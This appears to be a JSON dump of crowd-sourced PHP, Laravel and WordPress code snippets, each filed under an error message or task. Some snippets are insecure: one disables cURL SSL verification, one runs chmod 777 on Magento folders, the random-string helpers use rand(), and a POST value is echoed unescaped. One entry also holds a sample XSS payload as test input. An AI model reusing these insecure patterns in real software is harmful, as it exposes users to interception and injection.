    "description": "<?php   \tinclude(TEMPLATE_DIRECTORY . \"header.php\"); \tinclude(VIEW_DIRECTORY . \"somerandompage.php\"); \tinclude(TEMPLATE_DIRECTORY . \"footer.php\");  \t/*     \tThe header.php file would include all your navigation, head elements,         script links, and anything that should be displayed before any content.                  The somerandompage.php is your content for that page (can be anything,         basically anything that is unique to that particular page                  The footer.php file would include all your footers, end of HTML tags,         and anything that should be displayed after any content     */ ?>\nPHP Templates is a broad term. You could mean a templating engine like Blade or Twig which makes embedding PHP into HTML easier and safer by providing protections against XSS. You could also mean PHP Frameworks like Laravel and PHPCake which make writing PHP code much easier and in a well structured way (MVC usually)\n",
    "reg_date": "2021-10-12T10:12:26.000Z"
  },
  {
    "id": 252,
    "keyword": null,
    "link": null,
    "title": " PHP multidimensional array search by value",
    "description": "$key = array_search('100', array_column($userdb, 'uid')); \nfunction find_customer_mobile($customers, $mobile) {     foreach($customers as $index => $cust) {         if($cust['mobile'] == $mobile) return $index;     }     return FALSE; }\n  /**    * PHP Search an Array for multiple key / value pairs    */    function multi_array_search($array, $search) {     // Create the result array     $result = array();      // Iterate over each array element     foreach ($array as $key => $value){        // Iterate over each search condition       foreach ($search as $k => $v){          // If the array element does not meet the search condition then continue to the next element         if (!isset($value[$k]) || $value[$k] != $v){           continue 2;         }       }       // Add the array element's key to the result array       $result[] = $key;     }      // Return the result array     return $result;   }    // Output the result   print_r(multi_array_search($list_of_phones, array()));    // Array ( [0] => 0 [1] => 1 )    // Output the result   print_r(multi_array_search($list_of_phones, array('Manufacturer' => 'Apple')));    // Array ( [0] => 0 )    // Output the result   print_r(multi_array_search($list_of_phones, array('Manufacturer' => 'Apple', 'Model' => 'iPhone 6')));    // Array ( ) \n",
    "reg_date": "2021-10-12T10:12:26.000Z"
  },
  {
    "id": 253,
    "keyword": null,
    "link": null,
    "title": " PHP random string generator",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\n//generates 13 character random unique alphanumeric id echo uniqid(); //output - 5e6d873a4f597\nfunction rand_str() {     $characters = '0123456789-=+{}[]:;@#~.?/&gt;,&lt;|\\!\"&pound;$%^&amp;*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $randomstr = '';     for ($i = 0; $i < random_int(50, 100); $i++) {       $randomstr .= $characters[rand(0, strlen($characters) - 1)];     }     return $randomstr;   }\n<?php     function RandomString()     {         $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';         $randstring = '';         for ($i = 0; $i < 10; $i++) {             $randstring = $characters[rand(0, strlen($characters))];         }         return $randstring;     }      RandomString();     echo $randstring;\nphpCopy<?php  $Random_str = uniqid();   echo \"Random String:\", $Random_str, \"\\n\"; ?>  \nhttps//haryanvimodcrack.php\n",
    "reg_date": "2021-10-12T10:12:26.000Z"
  },
  {
    "id": 254,
    "keyword": null,
    "link": null,
    "title": " Pacific Daylight Time Zone php",
    "description": "date_default_timezone_set('America/Los_Angeles'); // or wherever you are  $time = time();  if ($time >= strtotime(\"Second Sunday March 0\")  && $time < strtotime(\"First Sunday November 0\"))  {      echo date('m/d/y h:i a', $time);  } else {      echo date('m/d/y h:i a', $time);  }\n",
    "reg_date": "2021-10-12T10:12:26.000Z"
  },
  {
    "id": 255,
    "keyword": null,
    "link": null,
    "title": " Parse error: syntax error, unexpected '?' in /opt/lampp/htdocs/Tack.php on line 2",
    "description": "Parse error: syntax error, unexpected '?' in /opt/lampp/htdocs/Tack.php on line 2   \n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 256,
    "keyword": null,
    "link": null,
    "title": " Pass all data to all pages laravel",
    "description": "use Illuminate\\Support\\Facades\\View;  class BaseController extends Controller {   public function __construct()   {     //its just a dummy data object.     $user = User::all();      // Sharing is caring     View::share('user', $user);   } } \nnamespace App\\Providers; use Illuminate\\Support\\Facades\\View; use Illuminate\\Support\\ServiceProvider; use Illuminate\\Support\\Facades\\Schema;  use Illuminate\\Support\\Facades\\Auth; use DB;   class AppServiceProvider extends ServiceProvider {     /**      * Bootstrap any application services.      *      * @return void      */     public function boot()     {          View::share('key', 'value');          Schema::defaultStringLength(191);          $categories=DB::table('categories')->get();         View::share('categories',$categories);        }      /**      * Register any application services.      *      * @return void      */     public function register()     {         //     } } \nthis work :) use Illuminate\\Support\\Facades\\View; \nphp artisan make:middleware SomeMiddleware \n# app/Providers/AppServiceProvider.php  public function boot() {    // add this     view()->share('someKey', 'This is shared data'); }\n{{Session::get('website_name', 'Value Goes Here')}} \n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 257,
    "keyword": null,
    "link": null,
    "title": " Please provide a valid cache path.",
    "description": "create this directories: storage/framework/sessions storage/framework/views storage/framework/cache\n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 258,
    "keyword": null,
    "link": null,
    "title": " Redirect::route('profile') and with() in laravel",
    "description": "// For a route with the following URI: profile/{id}  return redirect()->route('profile', [$user]);\n// For a route with the following URI: profile/{id}  return redirect()->route('profile', ['id' => 1]);\n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 259,
    "keyword": null,
    "link": null,
    "title": " Redirect image attachment pages in Wordpress",
    "description": "function myprefix_redirect_attachment_page() { \tif ( is_attachment() ) { \t\tglobal $post; \t\tif ( $post && $post->post_parent ) { \t\t\twp_redirect( esc_url( get_permalink( $post->post_parent ) ), 301 ); \t\t\texit; \t\t} else { \t\t\twp_redirect( esc_url( home_url( '/' ) ), 301 ); \t\t\texit; \t\t} \t} } add_action( 'template_redirect', 'myprefix_redirect_attachment_page' );\n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 260,
    "keyword": null,
    "link": null,
    "title": " Redirection in PHP",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nheader(\"Location: http://example.com\"); die();\nheader(\"Location: /\"); exit();\nheader(\"Location: http://example.com/myOtherPage.php\"); die();\n<?php header(\"Location: http://www.redirect.to.url.com/\"); ?> \n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 261,
    "keyword": null,
    "link": null,
    "title": " ReflectionException: Class Magento\\Framework\\App\\Http\\Interceptor does not exist in",
    "description": "php bin/magento setup:upgrade  php bin/magento setup:di:compile  php bin/magento setup:static-content:Deploy -f  chmod -R 777 var/ generated/ \n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 262,
    "keyword": null,
    "link": null,
    "title": " Remove “/public” from Laravel route",
    "description": "Rename server.php in your Laravel root folder to index.php Copy the .htaccess file from /public directory to your Laravel root folder.\nRewriteEngine On RewriteCond %{REQUEST_URI} !^/public/ RewriteRule ^(.*)$ /public/$1 [L,QSA]\n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 263,
    "keyword": null,
    "link": null,
    "title": " Remove .php htaccess",
    "description": "#remove html file extension-e.g. https://example.com/file.html will become https://example.com/file RewriteEngine on  RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\\.html -f RewriteRule ^(.*)$ $1.html [NC,L]\n//put this piece of code in the root file .htaccess RewriteEngine on #remove extension html RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\\.html -f RewriteRule ^(.*)$ $1.html [NC,L]  #remove extension php RewriteCond %{REQUEST_FILENAME} !-d  RewriteCond %{REQUEST_FILENAME}\\.php -f  RewriteRule ^(.*)$ $1.php\nRewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^([^\\.]+)$ $1.php [NC,L] \nRewriteCond %{REQUEST_FILENAME}.php -f RewriteRule !.*\\.php$ %{REQUEST_FILENAME}.php [QSA,L] \n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 264,
    "keyword": null,
    "link": null,
    "title": " Remove Special Character in PHP",
    "description": "phpCopy<?php function RemoveSpecialChar($str) {     $res = preg_replace('/[0-9\\@\\.\\;\\\" \"]+/', '', $str);     return $res; } $str = \"My name is  hello and email hello.world598@gmail.com;\"; $str1 = RemoveSpecialChar($str); echo \"My UpdatedString: \", $str1; ?> \nphpCopy<?php $str = \"@@HelloWorld\"; $str1 = substr($str, 1); echo $str1 . \"\\n\\n\"; $str1 = substr($str, 2); echo $str1; ?> \nphpCopy<?php $mainstr = \"@@PHP@Programming!!!.\"; echo \"Text before remove:\\n\" . $mainstr; echo \"\\n\\nText after remove: \\n\" . trim($mainstr, '@!.'); ?> \nphpCopy<?php $mainstr = \"<h2>Welcome to <b>PHPWorld</b></h2>\";  echo \"Text before remove: \\n\" . $mainstr;  echo \"\\n\\nText after remove: \\n\" .     str_ireplace(array('<b>', '</b>', '<h2>', '</h2>'), '',     htmlspecialchars($mainstr)); ?> \nphpCopy<?php $str = \"geeks\"; $str = ltrim($str, 'g'); echo $str; ?> \nphpCopy<?php $string = \"DelftStack is a best platform.....\"; echo \"Output:  \" . rtrim($string, \".\"); ?> \nphpCopy<?php $str = \"ei all, I said eello\"; //$trans = array(\"h\" => \"-\", \"hello\" => \"hi\", \"hi\" => \"hello\"); echo \"Output:  \" . strtr($str, \"e\", \"h\"); ?> \nphpCopy<?php $mainstr = \"This is a sim'ple text;\"; echo \"Text before remove: \\n\" . $mainstr, \"\\n\"; $replacestr = remove_sp_chr($mainstr); function remove_sp_chr($str) {     $result = str_replace(array(\"#\", \"'\", \";\"), '', $str);     echo \"\\n\\nText after remove: \\n\" . $result; } ?> \nphpCopy<?php $strTemplate = \"My name is :name, not :name2.\"; $strParams = [     ':name' => 'Dave',     'Dave' => ':name2 or :password',     ':name2' => 'Steve',     ':pass' => '7hf2348', ]; echo \"\\n\" . strtr($strTemplate, $strParams) . \"\\n\"; echo \"\\n\" . str_replace(array_keys($strParams), array_values($strParams), $strTemplate) . \"\\n\";   ?> \n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 265,
    "keyword": null,
    "link": null,
    "title": " Remove all attributes from HTML tags in PHP",
    "description": "$text = '<div class=\"test\"><p onmousemove=\"javascript:alert(1);\">Clean <a href=\"#\">text</a></p></div>';  $cleanText = preg_replace(\"/<([a-z][a-z0-9]*)[^>]*?(\\/?)>/si\",'<$1$2>', $text);\n",
    "reg_date": "2021-10-12T10:12:27.000Z"
  },
  {
    "id": 266,
    "keyword": null,
    "link": null,
    "title": " Root composer.json requires php ^7.2.5 but your php version (8.0.3) does not satisfy that require",
    "description": "composer install --ignore-platform-reqs\nIt's becouse in your project in composer.json file you have:  \"require\": {     \"php\": \">=7.3\",     ..... }, Try to update this requirement to:  \"require\": {     \"php\": \"^7.3|^8.0\",     ..... },\n It's becouse in your project in composer.json file you have:  \"require\": {     \"php\": \">=7.3\",     ..... }, Try to update this requirement to:  \"require\": {     \"php\": \"^7.3|^8.0\",     ..... },\n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 267,
    "keyword": null,
    "link": null,
    "title": " Root composer.json requires php ^7.2.5 but your php version (8.0.6) does not satisfy that requirement.",
    "description": "composer install --ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 268,
    "keyword": null,
    "link": null,
    "title": " Route::resourceVerbs",
    "description": "/** * By default, Route::resource will create resource URIs using English verbs. * If you need to localize the create and edit action verbs, * you may use the Route::resourceVerbs method. *This may be done at the beginning of the boot method within your application's * App\\Providers\\RouteServiceProvider: */  // app/providers/AppServiceProvider.php use Route;  /**  * Define your route model bindings, pattern filters, etc.  *  * @return void  */ public function boot() {     Route::resourceVerbs([         'create' => 'crear',         'edit' => 'editar',     ]);      // ... }\n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 269,
    "keyword": null,
    "link": null,
    "title": " Route::resource Verbs([]);",
    "description": "/** * By default, Route::resource will create resource URIs using English verbs. * If you need to localize the create and edit action verbs, * you may use the Route::resourceVerbs method. *This may be done at the beginning of the boot method within your application's * App\\Providers\\RouteServiceProvider: */  // app/providers/AppServiceProvider.php use Route;  /**  * Define your route model bindings, pattern filters, etc.  *  * @return void  */ public function boot() {     Route::resourceVerbs([         'create' => 'crear',         'edit' => 'editar',     ]);      // ... }\n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 270,
    "keyword": null,
    "link": null,
    "title": " SQLSTATE[42000]: Syntax error or access violation: 1071",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \n// Update your /app/Providers/AppServiceProvider.php to contain:  use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  //ON this error  //   PDOException::(\"SQLSTATE[42S01]: Base table or view already exists: 1050 Table 'users' already exists\") // After run ->  php artisan migrate:fresh  <- ! Note this will reset all tables in db\nuse Illuminate\\Support\\Facades\\Schema;  /**  * Bootstrap any application services.  *  * @return void  */ public function boot() {     Schema::defaultStringLength(191); } \n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 271,
    "keyword": null,
    "link": null,
    "title": " SQLSTATE[42000]: Syntax error or access violation: 1071 Specified key was too long; max key length is 1000 bytes",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \n// Update your /app/Providers/AppServiceProvider.php to contain:  use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  //ON this error  //   PDOException::(\"SQLSTATE[42S01]: Base table or view already exists: 1050 Table 'users' already exists\") // After run ->  php artisan migrate:fresh  <- ! Note this will reset all tables in db\nuse Illuminate\\Support\\Facades\\Schema;  /**  * Bootstrap any application services.  *  * @return void  */ public function boot() {     Schema::defaultStringLength(191); } \nPath : App/Providers/AppServiceProvider  Schema::defaultStringLength(191); in AppServiceProvider didn't work for me. What worked for was editing the database.php file in config folder. Just edit  'charset' => 'utf8mb4', 'collation' => 'utf8mb4_unicode_ci', to  'charset' => 'utf8', 'collation' => 'utf8_unicode_ci', and it should work, although you will be unable to store extended multibyte characters like emoji.\nSome Solution that worked for me: (Try running command after config:clear and                                    try migrate:fresh) 1. added default string length:  use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  2. changing engine to 'InnoDB' inside /config/database.php    'mysql' => [     ...,     ...,     'engine' => 'InnoDB',  ]    3. If still not solved try updating 'charset' and 'collation' inside    /config/database.php    'charset' => 'utf8mb4', 'collation' => 'utf8mb4_unicode_ci',  to  'charset' => 'utf8', 'collation' => 'utf8_unicode_ci',\n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 272,
    "keyword": null,
    "link": null,
    "title": " SQLSTATE[42000]: Syntax error or access violation: 1071 Specified key was too long; max key length is 1000 bytes (SQL: alter table `users` add unique `users email unique`(`email`))",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \nuse Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  \nuse Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }\nuse Illuminate\\Support\\Facades\\Schema;  /**  * Bootstrap any application services.  *  * @return void  */ public function boot() {     Schema::defaultStringLength(191); } \n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 273,
    "keyword": null,
    "link": null,
    "title": " SQLSTATE[HY000] [2002] php network getaddresses: getaddrinfo failed: nodename nor servname provided, or not known",
    "description": "Check your DB_HOST on your .env file  DB_HOST=http://localhost/ --> DB_HOST=localhost\n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 274,
    "keyword": null,
    "link": null,
    "title": " SSL PHP CURL",
    "description": "curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, false) \n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 275,
    "keyword": null,
    "link": null,
    "title": " Script @php artisan package:discover --ansi handling the post-autoload-dump event returned with error code 1",
    "description": "Run composer update\n\"extra\": {     \"laravel\": {         \"dont-discover\": [             \"laravel/dusk\"         ]     } },  and also do composer update \nupdating in file  vendor/laravel/framework/src/Illuminate/Foundation/PackageManifest.php $installed = json_decode($this->files->get($path), true); $packages = $installed['packages'] ?? $installed;\n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 276,
    "keyword": null,
    "link": null,
    "title": " Shorten long numbers to K/M/B?",
    "description": "<?php function convert(int $number) {     if ($number >= 1E9) {         return round($number / 1E9, 2).'b';     } else if ($number >= 1E6) {         return round($number / 1E6, 2).'m';     } else if ($number >= 1E3) {         return round($number / 1E3, 2).'k';     }     return $number; }  echo convert(1000000000).PHP_EOL; // 1b echo convert(1000000).PHP_EOL;    // 1m echo convert(1200).PHP_EOL;       // 1.2k echo convert(1234).PHP_EOL;       // 1.23k echo convert(100).PHP_EOL;        // 100\n",
    "reg_date": "2021-10-12T10:12:28.000Z"
  },
  {
    "id": 277,
    "keyword": null,
    "link": null,
    "title": " Show Custom Input Field @ WooCommerce Single Product Page",
    "description": "/**  * @snippet       Add input field to products - WooCommerce  * @how-to        Get CustomizeWoo.com FREE  * @author        Rodolfo Melogli  * @compatible    WooCommerce 3.9  * @donate $9     https://businessbloomer.com/bloomer-armada/  */   // ----------------------------------------- // 1. Show custom input field above Add to Cart   add_action( 'woocommerce_before_add_to_cart_button', 'bbloomer_product_add_on', 9 );   function bbloomer_product_add_on() {     $value = isset( $_POST['custom_text_add_on'] ) ? sanitize_text_field( $_POST['custom_text_add_on'] ) : '';     echo '<div><label>Custom Text Add-On <abbr class=\"required\" title=\"required\">*</abbr></label><p><input name=\"custom_text_add_on\" value=\"' . $value . '\"></p></div>'; }   // ----------------------------------------- // 2. Throw error if custom input field empty   add_filter( 'woocommerce_add_to_cart_validation', 'bbloomer_product_add_on_validation', 10, 3 );   function bbloomer_product_add_on_validation( $passed, $product_id, $qty ){    if( isset( $_POST['custom_text_add_on'] ) && sanitize_text_field( $_POST['custom_text_add_on'] ) == '' ) {       wc_add_notice( 'Custom Text Add-On is a required field', 'error' );       $passed = false;    }    return $passed; }   // ----------------------------------------- // 3. Save custom input field value into cart item data   add_filter( 'woocommerce_add_cart_item_data', 'bbloomer_product_add_on_cart_item_data', 10, 2 );   function bbloomer_product_add_on_cart_item_data( $cart_item, $product_id ){     if( isset( $_POST['custom_text_add_on'] ) ) {         $cart_item['custom_text_add_on'] = sanitize_text_field( $_POST['custom_text_add_on'] );     }     return $cart_item; }   // ----------------------------------------- // 4. Display custom input field value @ Cart   add_filter( 'woocommerce_get_item_data', 'bbloomer_product_add_on_display_cart', 10, 2 );   function bbloomer_product_add_on_display_cart( $data, $cart_item ) {     if ( isset( $cart_item['custom_text_add_on'] ) ){         $data[] = array(             'name' => 'Custom Text Add-On',             'value' => sanitize_text_field( $cart_item['custom_text_add_on'] )         );     }     return $data; }   // ----------------------------------------- // 5. Save custom input field value into order item meta   add_action( 'woocommerce_add_order_item_meta', 'bbloomer_product_add_on_order_item_meta', 10, 2 );   function bbloomer_product_add_on_order_item_meta( $item_id, $values ) {     if ( ! empty( $values['custom_text_add_on'] ) ) {         wc_add_order_item_meta( $item_id, 'Custom Text Add-On', $values['custom_text_add_on'], true );     } }   // ----------------------------------------- // 6. Display custom input field value into order table   add_filter( 'woocommerce_order_item_product', 'bbloomer_product_add_on_display_order', 10, 2 );   function bbloomer_product_add_on_display_order( $cart_item, $order_item ){     if( isset( $order_item['custom_text_add_on'] ) ){         $cart_item['custom_text_add_on'] = $order_item['custom_text_add_on'];     }     return $cart_item; }   // ----------------------------------------- // 7. Display custom input field value into order emails   add_filter( 'woocommerce_email_order_meta_fields', 'bbloomer_product_add_on_display_emails' );   function bbloomer_product_add_on_display_emails( $fields ) {      $fields['custom_text_add_on'] = 'Custom Text Add-On';     return $fields;  } \n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 278,
    "keyword": null,
    "link": null,
    "title": " Sorry, This File Type Is Not Permitted for Security Reasons",
    "description": "function my_custom_mime_types( $mimes ) {   // New allowed mime types. $mimes['svg'] = 'image/svg+xml'; $mimes['svgz'] = 'image/svg+xml'; $mimes['doc'] = 'application/msword';   // Optional. Remove a mime type. unset( $mimes['exe'] );   return $mimes;  } add_filter( 'upload_mimes', 'my_custom_mime_types' ); \n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 279,
    "keyword": null,
    "link": null,
    "title": " Split 10 email out of 50 email using coma separated via php",
    "description": "<?php   $emails =\"konopelski.ryann@yahoo.com, norene30@heidenreich.info, jessyca.carroll@hotmail.com, kelsie.stokes@yahoo.com, jeffertz@gutmann.com, jasen.ritchie@gmail.com, kbeier@streich.org, julian.marquardt@hotmail.com, casper35@welch.com, xhuels@hotmail.com, vdooley@stroman.com, wilbert.roob@hackett.com, fdoyle@kuhlman.com, tyshawn73@altenwerth.biz, shields.cory@gmail.com, yschroeder@gerhold.com, jeremy.wyman@hotmail.com, paige64@barrows.com, nader.gladys@hotmail.com, doyle.mcdermott@hirthe.com, daugherty.nicola@funk.biz, fwehner@purdy.com, legros.vidal@lesch.net, eve94@hotmail.com, ondricka.zoie@hotmail.com, rcruickshank@hotmail.com, hill.rey@hotmail.com, grace64@kub.com, devin46@sanford.com, irma92@beahan.net, rosalee12@gmail.com, nikolas.krajcik@yahoo.com, catalina.jacobi@hotmail.com, kendrick17@kilback.com, orrin39@yahoo.com, gladys.marquardt@gmail.com, bahringer.mitchel@gmail.com, yvolkman@marvin.net, pherzog@yahoo.com, kris.norval@koepp.com, breitenberg.micaela@braun.com, dejah.klocko@hermiston.com, conroy.elvera@hotmail.com, hayden.smith@yahoo.com, mable65@goyette.com, pward@shanahan.com, wrussel@hotmail.com, luisa64@heaney.com, oondricka@gmail.com, istreich@hotmail.com\"; $array = explode(',', $emails); /*// for random strings shuffle($array); */ $count = count($array); $res = array_slice($array, 0, 10); print_r($res); ?>\n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 280,
    "keyword": null,
    "link": null,
    "title": " Str slug laravel",
    "description": "use Illuminate\\Support\\Str;  $slug = Str::slug('Laravel 5 Framework', '-');  // laravel-5-framework\n$ composer require cviebrock/eloquent-sluggable\nphp artisan vendor:publish --provider=\"Cviebrock\\EloquentSluggable\\ServiceProvider\"\n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 281,
    "keyword": null,
    "link": null,
    "title": " Symfony\\Component\\Debug\\Exception\\FatalThrowableError : Class 'Seeder' not found",
    "description": "use Illuminate\\Database\\Seeder;\n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 282,
    "keyword": null,
    "link": null,
    "title": " Syntax error or access violation: 1071 Specified key was too long; max key length is 1000 bytes (SQL: alter table `users` add unique `users email unique`(`email`))",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \n// Update your /app/Providers/AppServiceProvider.php to contain:  use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  //ON this error  //   PDOException::(\"SQLSTATE[42S01]: Base table or view already exists: 1050 Table 'users' already exists\") // After run ->  php artisan migrate:fresh  <- ! Note this will reset all tables in db\nuse Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  \nuse Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }\nuse Illuminate\\Support\\Facades\\Schema;  /**  * Bootstrap any application services.  *  * @return void  */ public function boot() {     Schema::defaultStringLength(191); } \nPath : App/Providers/AppServiceProvider  Schema::defaultStringLength(191); in AppServiceProvider didn't work for me. What worked for was editing the database.php file in config folder. Just edit  'charset' => 'utf8mb4', 'collation' => 'utf8mb4_unicode_ci', to  'charset' => 'utf8', 'collation' => 'utf8_unicode_ci', and it should work, although you will be unable to store extended multibyte characters like emoji.\n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 283,
    "keyword": null,
    "link": null,
    "title": " Syntax error or access violation: 1071 Specified key was too long; max key length is 1000 bytes laravel 8",
    "description": "// Update your /app/Providers/AppServiceProvider.php to contain:  use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  //ON this error  //   PDOException::(\"SQLSTATE[42S01]: Base table or view already exists: 1050 Table 'users' already exists\") // After run ->  php artisan migrate:fresh  <- ! Note this will reset all tables in db\nUpdate your /app/Providers/AppServiceProvider.php to contain:  use Illuminate\\Support\\Facades\\Schema;  /**  * Bootstrap any application services.  *  * @return void  */ public function boot() {     Schema::defaultStringLength(191); }\nSome Solution that worked for me: (Try running command after config:clear and                                    try migrate:fresh) 1. added default string length:  use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  2. changing engine to 'InnoDB' inside /config/database.php    'mysql' => [     ...,     ...,     'engine' => 'InnoDB',  ]    3. If still not solved try updating 'charset' and 'collation' inside    /config/database.php    'charset' => 'utf8mb4', 'collation' => 'utf8mb4_unicode_ci',  to  'charset' => 'utf8', 'collation' => 'utf8_unicode_ci',\n'charset' => 'utf8', 'collation' => 'utf8_unicode_ci',\n'charset' => 'utf8mb4', 'collation' => 'utf8mb4_unicode_ci',\n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 284,
    "keyword": null,
    "link": null,
    "title": " TRANSACTON LARAVEL QUERY BUILDER",
    "description": "DB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Throwable $e) {     DB::rollback();     throw $e; }\n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 285,
    "keyword": null,
    "link": null,
    "title": " Target class [Barryvdh\\Cors\\HandleCors] does not exist.",
    "description": "#Add [Barryvdh\\Cors\\HandleCors] to $middlewareGroups in Kernel.php 'cors' => [ \\Barryvdh\\Cors\\HandleCors::class, ],\nphp composer dump-autoload php artisan migrate:refresh --seed\n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 286,
    "keyword": null,
    "link": null,
    "title": " Target class [Controller] does not exist.",
    "description": "//accessing any function in the controller (this is web.php file) use App\\Http\\Controllers\\PostsController;  Route::get('/post', 'App\\Http\\Controllers\\PostsController@index');\nuse App\\Http\\Controllers\\UserController;  Route::get('/users', [UserController::class, 'index']); // or Route::get('/users', 'App\\Http\\Controllers\\UserController@index'); \n Route::get('/users', [UserController::class, 'index']);\n[PagesController::class, 'index']\n//In laravel 8 uncomment  protected $namespace='App\\\\Http\\\\Controllers';\n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 287,
    "keyword": null,
    "link": null,
    "title": " Target class does not exist.",
    "description": "//accessing any function in the controller (this is web.php file) use App\\Http\\Controllers\\PostsController;  Route::get('/post', 'App\\Http\\Controllers\\PostsController@index');\nUncomment this line in app>>provider>>RouteServiceProvider.php file // protected $namespace = 'App\\\\Http\\\\Controllers';\nphp composer dump-autoload php artisan migrate:refresh --seed\nuse App\\Http\\Controllers\\UserController;  Route::get('/users', [UserController::class, 'index']); // or Route::get('/users', 'App\\Http\\Controllers\\UserController@index'); \nuse App\\Http\\Controllers\\RegistrationController;  Route::get('/', [RegistrationController::class, 'create']); \nRoute::get('/', 'App\\Http\\Controllers\\RegistrationController@create'); \n",
    "reg_date": "2021-10-12T10:12:29.000Z"
  },
  {
    "id": 288,
    "keyword": null,
    "link": null,
    "title": " The mysqli extension is missing. Please check your PHP configuration.",
    "description": "uncomments in the php/php.ini ;mysqli.allow_local_infile = On\n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 289,
    "keyword": null,
    "link": null,
    "title": " The only supported ciphers are AES-128-CBC and AES-256-CBC with the correct key lengths.",
    "description": "$ php artisan key:generate \n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 290,
    "keyword": null,
    "link": null,
    "title": " The uploaded file exceeds the upload max filesize directive in php.ini.",
    "description": "Open the php.ini file  Locate the following line: upload_max_filesize = 100M    Replace 100M with a higher value in megabytes. (256 MB for example) This file allows you to configure other settings as well:  memory_limit 256M &ndash; Sets the max amount of memory a script can use. post_max_size 32M &ndash; Sets the max size for the total of the POST body data. max_execution_time 600 &ndash; Max time, in seconds, that a script is allowed to run. max_input_time 900 &ndash; Max time, in seconds, that a script is allowed to parse input data.  Save the file and exit.    /* I hope it will help you. Namaste Stay Home Stay Safe */\nphp_value upload_max_filesize 256M\n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 291,
    "keyword": null,
    "link": null,
    "title": " This solved my issue with dates and laravel livewire",
    "description": "    /// This solved my issue with dates and laravel livewire      <div wire.ignore.self>     <input wire.model=\"birthday_date\"  id=\"birthday_date\" class=\"form-controll date\" >    <script>             document.addEventListener('livewire:load', function () {                                      $('#birthday_date').on('dp.change', function (e) {                                          @this.set('birthday_date', e.target.value);                     });             });         </script>    </div>\n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 292,
    "keyword": null,
    "link": null,
    "title": " To find out where your php.ini is located",
    "description": "run: php --ini\n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 293,
    "keyword": null,
    "link": null,
